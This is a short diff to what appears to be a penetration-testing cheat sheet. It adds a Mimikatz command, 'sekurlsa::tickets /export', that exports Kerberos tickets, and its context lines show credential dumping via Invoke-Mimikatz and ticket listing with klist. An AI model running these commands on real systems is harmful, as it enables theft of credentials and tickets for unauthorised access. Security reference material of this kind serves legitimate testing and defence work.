@@ -2388,6 +2388,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Ticket Grabbing
 sekurlsa::tickets  #Run with mimikatz
+sekurlsa::tickets /export
 
 PS C:\Users\Public\Documents> klist  #klist dumps tickets in powershell
 
